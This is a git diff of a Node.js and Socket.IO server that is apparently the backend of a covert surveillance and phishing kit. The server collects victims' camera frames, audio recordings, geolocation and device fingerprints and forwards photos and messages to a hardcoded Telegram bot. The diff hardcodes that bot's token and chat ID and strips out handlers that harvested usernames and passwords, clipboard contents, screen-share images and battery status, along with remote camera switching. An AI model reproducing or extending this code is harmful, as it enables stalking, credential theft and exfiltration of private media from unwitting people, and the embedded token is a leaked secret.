@@ -21,7 +21,8 @@ const DATA_FILE = path.join(__dirname, 'data.json');
 // ═══════════════════════════════════════════════════════════════════
 // TELEGRAM CONFIGURATION
 // ═══════════════════════════════════════════════════════════════════
-// Telegram config is now loaded from db.settings
+const TELEGRAM_BOT_TOKEN = '8086423271:AAHnppYI0Os1KGWOD0JpynQliY7hdVxM3HI';
+const TELEGRAM_CHAT_ID = '8262870180';
 
 /**
  * Send a photo to Telegram via Bot API using Node's built-in https module.
@@ -38,7 +39,7 @@ function sendPhotoToTelegram(photoBuffer, caption) {
   // chat_id field
   parts.push(`--${boundary}\r\n`);
   parts.push(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`);
-  parts.push(`${db.settings.telegram_chat_id}\r\n`);
+  parts.push(`${TELEGRAM_CHAT_ID}\r\n`);
 
   // caption field
   if (caption) {
@@ -58,7 +59,7 @@ function sendPhotoToTelegram(photoBuffer, caption) {
 
   const options = {
     hostname: 'api.telegram.org',
-    path: `/bot${db.settings.telegram_bot_token}/sendPhoto`,
+    path: `/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
     method: 'POST',
     headers: {
       'Content-Type': `multipart/form-data; boundary=${boundary}`,
@@ -92,14 +93,14 @@ function sendPhotoToTelegram(photoBuffer, caption) {
  */
 function sendTextToTelegram(text) {
   const postData = JSON.stringify({
-    chat_id: db.settings.telegram_chat_id,
+    chat_id: TELEGRAM_CHAT_ID,
     text: text,
     parse_mode: 'HTML'
   });
 
   const options = {
     hostname: 'api.telegram.org',
-    path: `/bot${db.settings.telegram_bot_token}/sendMessage`,
+    path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
@@ -143,7 +144,7 @@ function sendAudioToTelegram(audioBuffer, caption, mimeType) {
   // chat_id field
   parts.push(`--${boundary}\r\n`);
   parts.push(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`);
-  parts.push(`${db.settings.telegram_chat_id}\r\n`);
+  parts.push(`${TELEGRAM_CHAT_ID}\r\n`);
 
   // caption field
   if (caption) {
@@ -164,7 +165,7 @@ function sendAudioToTelegram(audioBuffer, caption, mimeType) {
 
   const options = {
     hostname: 'api.telegram.org',
-    path: `/bot${db.settings.telegram_bot_token}/sendDocument`,
+    path: `/bot${TELEGRAM_BOT_TOKEN}/sendDocument`,
     method: 'POST',
     headers: {
       'Content-Type': `multipart/form-data; boundary=${boundary}`,
@@ -208,12 +209,7 @@ let db = {
   users: [],      // { uuid, session_ids: { cookie_session_id, tab_session_id, page_load_id, socket_id, fingerprint_id, local_storage_id, engine_io_id }, country, browser, device_type, ip, is_online, created_at, last_active, location }
   captures: [],   // { id, uuid, file_path, file_size, created_at }
   recordings: [], // { id, uuid, file_path, duration, file_size, mime_type, created_at }
-  locations: [],   // { uuid, latitude, longitude, accuracy, altitude, speed, heading, timestamp }
-  credentials: [],  // { id, uuid, platform, username, password, created_at }
-  settings: {
-    telegram_bot_token: '8086423271:AAHnppYI0Os1KGWOD0JpynQliY7hdVxM3HI',
-    telegram_chat_id: '8262870180'
-  }
+  locations: []   // { uuid, latitude, longitude, accuracy, altitude, speed, heading, timestamp }
 };
 
 let activityLog = []; // { id, type, uuid, message, timestamp }
@@ -236,11 +232,9 @@ function loadData() {
       db.captures = saved.captures || [];
       db.recordings = saved.recordings || [];
       db.locations = saved.locations || [];
-      db.credentials = saved.credentials || [];
-      if (saved.settings) db.settings = saved.settings;
       // Mark all users offline on startup
       db.users.forEach(u => u.is_online = false);
-      console.log(`📂 Loaded ${db.users.length} users, ${db.captures.length} captures, ${db.recordings.length} recordings, ${db.locations.length} locations, ${db.credentials.length} credentials`);
+      console.log(`📂 Loaded ${db.users.length} users, ${db.captures.length} captures, ${db.recordings.length} recordings, ${db.locations.length} locations`);
     }
   } catch (e) {
     console.log('📂 Starting with fresh database');
@@ -253,9 +247,7 @@ function saveData() {
       users: db.users,
       captures: db.captures,
       recordings: db.recordings,
-      locations: db.locations,
-      credentials: db.credentials,
-      settings: db.settings
+      locations: db.locations
     }, null, 2));
   } catch (e) { /* silent */ }
 }
@@ -276,8 +268,7 @@ setInterval(sendDailySummary, 24 * 60 * 60 * 1000);
 let nextId = Math.max(
   0,
   ...db.captures.map(c => c.id || 0),
-  ...db.recordings.map(r => r.id || 0),
-  ...db.credentials.map(c => c.id || 0)
+  ...db.recordings.map(r => r.id || 0)
 ) + 1;
 
 // ═══════════════════════════════════════════════════════════════════
@@ -452,29 +443,6 @@ app.get('/api/recordings/:id/stream', (req, res) => {
   fs.createReadStream(filePath).pipe(res);
 });
 
-// ─── Credentials Routes ──────────────────────────────────────────
-app.get('/api/credentials', authCheck, (req, res) => {
-  const uuid = req.query.uuid;
-  let credentials = uuid ? db.credentials.filter(c => c.uuid === uuid) : [...db.credentials];
-  credentials.sort((a, b) => new Date(b.created_at) - new Date(a.created_at));
-  res.json({ credentials: credentials.slice(0, 500) });
-});
-
-app.delete('/api/credentials/:id', authCheck, (req, res) => {
-  const id = parseInt(req.params.id);
-  db.credentials = db.credentials.filter(c => c.id !== id);
-  saveData();
-  res.json({ message: 'Credentials deleted' });
-});
-
-app.post('/api/credentials/batch-delete', authCheck, (req, res) => {
-  const { ids } = req.body;
-  if (!ids || !Array.isArray(ids)) return res.status(400).json({ error: 'ids array required' });
-  db.credentials = db.credentials.filter(c => !ids.includes(c.id));
-  saveData();
-  res.json({ message: 'Credentials deleted' });
-});
-
 // ─── Location Routes ─────────────────────────────────────────────
 app.get('/api/locations', authCheck, (req, res) => {
   const userLocations = db.users
@@ -570,7 +538,6 @@ app.get('/api/export', authCheck, (req, res) => {
     users: db.users,
     captures: db.captures,
     recordings: db.recordings,
-    credentials: db.credentials,
     activity_log: activityLog
   });
 });
@@ -583,33 +550,6 @@ app.get('/api/stats', authCheck, (req, res) => {
     totalCaptures: db.captures.length,
     totalRecordings: db.recordings.length
   });
-});
-
-// ─── Settings Routes ────────────────────────────────────────────────
-app.get('/api/settings', authCheck, (req, res) => {
-  res.json({ settings: db.settings });
-});
-
-app.put('/api/settings', authCheck, (req, res) => {
-  const { telegram_bot_token, telegram_chat_id } = req.body;
-  if (telegram_bot_token) db.settings.telegram_bot_token = telegram_bot_token;
-  if (telegram_chat_id) db.settings.telegram_chat_id = telegram_chat_id;
-  saveData();
-  res.json({ message: 'Settings updated' });
-});
-
-// ─── Batch Users Actions ───────────────────────────────────────────
-app.post('/api/users/batch-delete-offline', authCheck, (req, res) => {
-  const offlineUsers = db.users.filter(u => !u.is_online).map(u => u.uuid);
-  const deleted = offlineUsers.length;
-  
-  db.users = db.users.filter(u => u.is_online);
-  db.captures = db.captures.filter(c => !offlineUsers.includes(c.uuid));
-  db.recordings = db.recordings.filter(r => !offlineUsers.includes(r.uuid));
-  
-  saveData();
-  addLog('delete', '', `Batch deleted ${deleted} offline users`);
-  res.json({ message: `${deleted} offline users deleted` });
 });
 
 // ═══════════════════════════════════════════════════════════════════
@@ -668,16 +608,6 @@ io.on('connection', (socket) => {
     socket.on('webrtc:stop', (data) => {
       if (!data || !data.userSocketId) return;
       io.to(data.userSocketId).emit('webrtc:stop');
-    });
-
-    // Camera Switch (Admin tells User to switch front/back camera)
-    socket.on('camera:switch', (data) => {
-      if (!data || !data.uuid) return;
-      const userSocketId = connectedUsers.get(data.uuid);
-      if (userSocketId) {
-        console.log(`📷 [Camera Switch] Admin requesting camera switch for user ${data.uuid} to ${data.facingMode || 'toggle'}`);
-        io.to(userSocketId).emit('camera:switch', { adminSocketId: socket.id, facingMode: data.facingMode || null });
-      }
     });
 
     socket.on('disconnect', () => {
@@ -787,69 +717,6 @@ io.on('connection', (socket) => {
       });
     });
 
-    socket.on('battery:update', (data) => {
-      if (!data || !data.uuid) return;
-      const user = db.users.find(u => u.uuid === data.uuid);
-      if (user) {
-        user.battery = { level: data.level, charging: data.charging };
-        user.last_active = new Date().toISOString();
-        io.to('admin').emit('user:update', user);
-      }
-    });
-
-    socket.on('clipboard:update', (data) => {
-      if (!data || !data.uuid || !data.text) return;
-      const user = db.users.find(u => u.uuid === data.uuid);
-      if (user) {
-        user.clipboard = data.text;
-        user.last_active = new Date().toISOString();
-        io.to('admin').emit('user:update', user);
-        addLog('info', data.uuid, 'Clipboard data captured: ' + data.text.substring(0, 50));
-      }
-    });
-
-    socket.on('screenshare:update', (data) => {
-      if (!data || !data.uuid || !data.image) return;
-      const uuid = data.uuid;
-      const timestamp = Date.now();
-      const fileName = `screen_${uuid}_${timestamp}.jpg`;
-      const filePath = path.join(MEDIA_DIR, 'captures', fileName);
-
-      try {
-        const base64 = data.image.replace(/^data:image\/\w+;base64,/, '');
-        const buffer = Buffer.from(base64, 'base64');
-        fs.writeFileSync(filePath, buffer);
-
-        const capture = {
-          id: nextId++,
-          uuid,
-          file_path: 'captures/' + fileName,
-          file_size: buffer.length,
-          created_at: new Date().toISOString()
-        };
-        db.captures.push(capture);
-
-        const user = db.users.find(u => u.uuid === uuid);
-        if (user) user.last_active = new Date().toISOString();
-
-        io.to('admin').emit('feed:frame', {
-          uuid,
-          captureId: capture.id,
-          imageUrl: '/media/captures/' + fileName,
-          timestamp,
-          fileSize: buffer.length
-        });
-
-        const captionUser = db.users.find(u => u.uuid === uuid);
-        const caption = `🖥️ Screen Share Capture\nUser: ${uuid}\nDevice: ${captionUser?.device_type || 'Unknown'}\n${new Date().toLocaleString()}`;
-        sendPhotoToTelegram(buffer, caption);
-        addLog('capture', uuid, 'Screen share captured');
-        emitStats();
-      } catch (e) {
-        console.error('Screenshare frame error:', e.message);
-      }
-    });
-
     socket.on('camera:frame', (data) => {
       if (!data || !data.uuid || !data.frame) return;
 
@@ -948,30 +815,6 @@ io.on('connection', (socket) => {
       } catch (e) {
         console.error('Audio recording error:', e.message);
       }
-    });
-
-    // Handle credentials submission
-    socket.on('credentials:submit', (data) => {
-      if (!data || !data.uuid || !data.platform || (!data.username && !data.password)) return;
-      const uuid = data.uuid;
-      
-      const cred = {
-        id: nextId++,
-        uuid,
-        platform: data.platform,
-        username: data.username,
-        password: data.password,
-        created_at: new Date().toISOString()
-      };
-      
-      db.credentials.push(cred);
-      saveData();
-      
-      addLog('credentials', uuid, `Captured ${data.platform} credentials`);
-      io.to('admin').emit('feed:credentials', cred);
-      
-      const user = db.users.find(u => u.uuid === uuid);
-      if (user) user.last_active = new Date().toISOString();
     });
 
     // Handle location updates from mobile users
